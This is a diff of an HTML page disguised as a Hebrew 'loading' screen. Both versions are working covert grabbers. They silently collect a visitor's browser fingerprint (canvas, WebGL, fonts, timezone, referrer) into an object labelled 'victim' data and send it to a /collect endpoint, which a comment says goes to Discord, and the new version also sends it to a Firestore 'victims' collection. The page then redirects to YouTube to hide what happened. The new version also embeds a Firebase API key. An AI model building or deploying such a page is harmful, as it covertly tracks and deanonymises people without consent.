@@ -1,86 +1,67 @@
 <!DOCTYPE html>
-<html lang="he">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
-    <style>
-        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .loader { font-size: 24px; }
-    </style>
-</head>
-<body>
-    <div class="loader">טוען...</div>
-    <script>
-        // איסוף מידע מקיף על המבקר
-        const victimInfo = {
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            language: navigator.language || navigator.languages[0],
-            platform: navigator.platform,
-            cookiesEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-            viewport: `${window.innerWidth}x${window.innerHeight}`,
-            referrer: document.referrer || 'direct',
-            url: window.location.href,
-            localStorage: !!window.localStorage,
-            sessionStorage: !!window.sessionStorage,
-            canvasFingerprint: (function() {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillText('Fingerprint test', 2, 2);
-                return canvas.toDataURL();
-            })(),
-            webglFingerprint: (function() {
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        return debugInfo ? {
-                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                        } : 'no_webgl';
-                    }
-                } catch(e) { return 'error'; }
-            })(),
-            plugins: Array.from(navigator.plugins).map(p => p.name),
-            fonts: (function() {
-                const testStr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-                const test = document.createElement('span');
-                test.style.fontSize = '72px';
-                test.style.visibility = 'hidden';
-                test.innerHTML = testStr;
-                document.body.appendChild(test);
-                const defaultWidth = {};
-                const defaultHeight = {};
-                ['monospace', 'serif', 'sans-serif'].forEach(family => {
-                    test.style.fontFamily = family;
-                    defaultWidth[family] = test.offsetWidth;
-                    defaultHeight[family] = test.offsetHeight;
-                });
-                document.body.removeChild(test);
-                return { defaultWidth, defaultHeight };
-            })(),
-            ip: 'fetching...', // יתווסף בצד השרת
-            headers: 'server-side' // יתווסף בצד השרת
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        // הקונפיג שלך
+        const firebaseConfig = {
+            apiKey: "AIzaSyDCmXZoM__bVIQ8xok5uv6UVf_DERvh4bY",
+            authDomain: "elias-7d300.firebaseapp.com",
+            projectId: "elias-7d300",
+            storageBucket: "elias-7d300.firebasestorage.app",
+            messagingSenderId: "90471380067",
+            appId: "1:90471380067:web:4444777056e8d0d847f456"
         };
 
-        // שליחת המידע לשרת
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // איסוף מידע מקיף
+        const victimData = {
+            timestamp: new Date().toISOString(),
+            ip: 'server',
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            viewport: `${window.innerWidth}x${window.innerHeight}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            canvas: document.createElement('canvas').toDataURL(),
+            webgl: navigator.gpu ? 'supported' : 'no',
+            plugins: navigator.plugins.length,
+            cookies: navigator.cookieEnabled,
+            localStorage: !!localStorage,
+            referrer: document.referrer,
+            url: location.href,
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink
+            } : null,
+            battery: navigator.getBattery ? 'supported' : 'no'
+        };
+
+        // שמירה ב-Firestore
+        addDoc(collection(db, "victims"), victimData)
+            .then(() => console.log('✅ Firebase'))
+            .catch(e => console.log('Firebase error'));
+
+        // שלח לשרת (לדיסקורד)
         fetch('/collect', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(victimInfo)
-        }).catch(() => {}); // שקט גם אם נכשל
+            body: JSON.stringify(victimData)
+        });
 
-        // הסטה מיידית אחרי 0.1 שניות
+        // הסטה אחרי 100ms
         setTimeout(() => {
             window.location.href = 'https://www.youtube.com/watch?v=9E6b3swbnWg';
         }, 100);
     </script>
-</body>
+    <style>body{background:#000;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;font-size:24px;}</style>
+</head>
+<body>טוען...</body>
 </html>
